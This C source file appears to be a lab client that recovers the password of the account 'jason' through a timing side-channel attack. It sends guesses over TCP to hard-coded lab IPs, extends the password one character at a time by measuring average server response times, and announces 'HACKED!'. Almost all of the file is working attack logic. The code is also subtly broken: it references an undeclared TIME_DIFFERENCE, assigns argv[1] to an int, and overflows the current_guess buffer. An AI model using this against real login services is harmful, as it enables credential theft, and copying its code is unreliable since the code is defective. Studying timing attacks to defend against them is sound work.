// Client side C/C++ program to demonstrate Socket programming
// Reference: https://www.geeksforgeeks.org/socket-programming-cc/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#define BUF_SIZE 256
#define PORT 39393
#define jason_ip "192.168.0.190"
#define shan_ip "192.168.1.46"
#define shan_linux_ip "128.252.167.161"
#define shan_lab_ip "192.168.122.1"

char* ip = shan_lab_ip;

#define NUM_ITERS 10
#define NUM_CHARS 27

// add A-Z, 0-9, !, @, *
char CHARS[NUM_CHARS] = {'a','b','c','d','e','f','g','h','i',
                         'j','k','l','m','n','o','p','q','r',
                         's','t','u','v','w','x','y','z','_'};
#define SUCCESS "Successfully logged in!"

struct timespec req_before, req_after;
const int num_expected_args = 2;

double test_creds(char* user, char* pass, int username_size, int password_size, int socket) {
    int result;
    char response[BUF_SIZE];

    //send username
    send(socket, user, username_size, 0);

    //wait for server before sending password
    if ((result = read(socket, response, sizeof(response))) == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    //send password
    send(socket, pass, password_size, 0);
    clock_gettime(CLOCK_MONOTONIC, &req_before); //record time before
    result = read(socket, response, sizeof(response));
    clock_gettime(CLOCK_MONOTONIC, &req_after); //record time after

    if (result == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    if (strcmp(response, SUCCESS) == 0) {
        printf("%s\n", response);
        return -2;
    }

    double ret = req_after.tv_nsec - req_before.tv_nsec;
    if (ret < 0) {
        ret += 1000000000;
    }

    return ret / 1000;

}

char *perform_attack (int socket, char* username) {
    char *guess = malloc(BUF_SIZE);
    guess[0] = '\0'; //empty string not checked
    double test;
    double exec_time = 0;
    double accum;

    while(1) {
        char current_guess[strlen(guess) + 1];

        for (int i = 0; i < NUM_CHARS; i++) {
            strcpy(current_guess, guess);
            strncat(current_guess, &CHARS[i], 1);
            accum = 0;
            for (int j = 0; j < NUM_ITERS; j++) {
                test = test_creds(username, current_guess, strlen(username), strlen(current_guess), socket);
                if (test == -1) exit(EXIT_FAILURE);
                else if (test == -2) {
                    strncat(guess, &CHARS[i], 1);
                    printf("Found password - exiting perform_attack().\n");
                    return guess;
                }
                
                accum += test;
            }

            test = accum / NUM_ITERS;

            printf("average for char %c is %lf\n", CHARS[i], test);

            if (test - exec_time > TIME_DIFFERENCE) {
                printf("test - exec_time is greater than TIME_DIFFERENCE\n");
                exec_time = test;
                strcpy(guess, current_guess);
                break;
            }
        }

        printf("current guess is %s\n", guess);

    //perror("password not recovered");
    //exit(EXIT_FAILURE); //?
    }
  
}

int main(int argc, char const *argv[]) {
  if (argc != num_expected_args) {
    printf("Usage: ./client_test <TIME_DIFFERENCE (us)>");
    exit(EXIT_FAILURE);
  }

    int TIME_DIFFERENCE = argv[1];
  int sock = 0;
  struct sockaddr_in serv_addr;

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("Error creating socket");
    exit(EXIT_FAILURE);
  }

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);

  if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
	  perror("Error in init_pton");
	  exit(EXIT_FAILURE);
  }

  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    perror("Failed to connect");
	  exit(EXIT_FAILURE);
  }

  printf("connected\n");


  char *password = perform_attack(sock, "jason");
  printf("Password for jason is %s. HACKED!\n", password);

    free(password);

  close(sock);
  return 0;
}
